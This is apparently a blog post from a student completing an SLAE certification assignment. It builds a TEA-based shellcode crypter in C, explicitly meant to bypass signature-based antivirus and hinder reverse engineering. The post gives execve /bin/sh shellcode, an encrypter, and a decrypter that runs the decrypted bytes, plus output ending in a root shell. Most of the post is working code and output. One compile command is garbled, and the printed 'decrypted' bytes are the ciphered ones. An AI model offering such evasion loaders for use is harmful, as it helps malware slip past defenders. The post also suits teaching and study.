---
layout: post
title:  "SLAE Assignment 7 - Custom crypter"
date:   2017-04-30
category: Certification
excerpt_separator: <!--more-->
hidden: true
---
<br />
Student **SLAE - 891**  
Github: [https://github.com/phackt/slae](https://github.com/phackt/slae)  
[http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
  
### Assignment 7:  
    
**Our Goal:**  
> *Create a custom crypter*
 - *Free to use any existing encryption schema*
 - *Can use any programming language*  
<!--more-->
  
Hello everybody,  
  
In this last assignment we will aim at creating a shellcode crypter. The crypter program will cipher our shellcode in order to defeat any reverse-engineering analysis and to bypass fingerprint/signature based anti-virus detection.  
  
A quick search for a simple encryption algorithm leads to the [Tiny Encryption Algorithm](https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm):  
*'In cryptography, the Tiny Encryption Algorithm (TEA) is a block cipher notable for its simplicity of description and implementation, typically a few lines of code.'*  
  
![image]({{ site.url }}/public/images/slae/assignment7/image.png)  
  
If you want to read more about the Tiny Encryption Algorithm and its implementation and weaknesses nowadays, here is a [link](http://www.tayloredge.com/reference/Mathematics/TEA-XTEA.pdf).  

For this assignment we will use the [execve-stack.nasm](https://github.com/phackt/slae/tree/master/assignment7/execve-stack.nasm) shellcode:  
```
\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```
  
Now let's create our C crypter [tea_crypter.c](https://github.com/phackt/slae/tree/master/assignment7/tea_crypter.c):  
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void encode(long *data, long *key) {
	unsigned long y = data[0], z = data[1],
	sum = 0, delta = 0x9e3779b9, n = 32;
	while (n-- > 0) {
		sum += delta;
		y += (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
		z += (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3];
	}
	data[0] = y;
	data[1] = z;
}

void decode(long *data, long *key) {
	unsigned long n = 32, sum, y = data[0], z = data[1],
	delta=0x9e3779b9;
	sum = delta << 5;
	while (n-- > 0) {
	     	z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
	     	y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
	     	sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;  
}

/* Character Array Functions */
void codestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		encode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

void decodestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

int main() {
	char shellcode[] = \
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; //execve-stack
	
	int last;
	char *str, buff[512];
	char key[16] = "iloveshellcodess";
	
	str = shellcode;

	codestr(str, key);

	printf("\Ciphered shellcode size: %d\n", strlen(str));
	printf("\Ciphered shellcode:\n");

	int j;
	for (j=0;j<strlen(str);j++)
	{
		printf("\\x%02x", (unsigned char)(int)str[j]);
	}
	
	return 0;
}
```
  
Let's compile and run our TEA crypter:  
```bash
# gcc -fno-stack-protector -z execstack -o tea_crypter tea_crypter.c && chmod u+x ./tea_crypter && ./tea_crypter
Ciphered shellcode size: 25
Ciphered shellcode:
\x75\xac\xf4\x4c\x4f\x97\x9a\x0a\x92\xb5\x29\x5f\x9e\xa3\xa0\x53\xa7\xa9\xcd\x3c\x6f\x85\xee\x95\x80
```  
  
Now let's decrypt and execute this shellcode ([tea_decrypter.c](https://github.com/phackt/slae/tree/master/assignment7/tea_decrypter.c)):  
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void decode(long *data, long *key) {
	unsigned long n = 32, sum, y = data[0], z = data[1],
	delta=0x9e3779b9;
	sum = delta << 5;
	while (n-- > 0) {
	     	z -= (y << 4) + (key[2]^y) + (sum^(y >> 5)) + key[3]; 
	     	y -= (z << 4) + (key[0]^z) + (sum^(z >> 5)) + key[1];
	     	sum -= delta;  
	}
	data[0] = y; 
	data[1] = z;  
}

/* Character Array Functions */
void decodestr(char *datastr, char *keystr) {
	int i = 0, datasize;
	long *data = (long *)datastr;
	long *key = (long *)keystr;
	datasize = strlen(datastr) / sizeof(long);
	datasize = 0 ? 1 : datasize;
	while (i < datasize) {
		decode(data, key);
		i += 2;
		data = (long *)datastr + i;
	}
}

int main() {
	char shellcode[] = \
	"\x75\xac\xf4\x4c\x4f\x97\x9a\x0a\x92\xb5\x29\x5f\x9e\xa3\xa0\x53\xa7\xa9\xcd\x3c\x6f\x85\xee\x95\x80";	

	char buffer[512];
	char key[16] = "iloveshellcodess";
	
	strcpy(buffer, shellcode);
	decodestr(buffer, key);
	
	printf("Decrypted shellcode:\n");
	for (int i=0;i<strlen(shellcode);i++)
	{
		printf("\\x%02x", (unsigned char)(int)shellcode[i]);
	}

	// we are executing the shellcode once it has been decrypted
	printf("\nRunning shellcode...\n");
	int (*ret)() = (int(*)())buffer;
	ret();
	
	return 0;
}
```
  
Then:  
```bash
# gcc -fno-stack-protector -z execstack -o tea_crypter tea_crypter.c && chmod u+x ./tegcc -fno-stack-protector -z execstack -o tea_decrypter tea_decrypter.c && chmod u+x ./tea_decrypter && ./tea_decrypter
Decrypted shellcode:
\x75\xac\xf4\x4c\x4f\x97\x9a\x0a\x92\xb5\x29\x5f\x9e\xa3\xa0\x53\xa7\xa9\xcd\x3c\x6f\x85\xee\x95\x80
Running shellcode...
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
  
Perfect, so our shellcode has been well decrypted and executed. Remember that TEA has some weaknesses, you may use another algorithm if you need strong encryption (AES, RSA, Blowfish, Twofish, ...).  Also avoid simple XOR encryption because the xoring key can be guessed thanks to a tool like [xortool](https://github.com/hellman/xortool).  
  
So it was our last assignment for the exam of the  [http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  course.  
Thanks again to Vivek and its team for their work.  
  
Hope to see you soon,
  
[Phackt](https://twitter.com/phackt_ul)
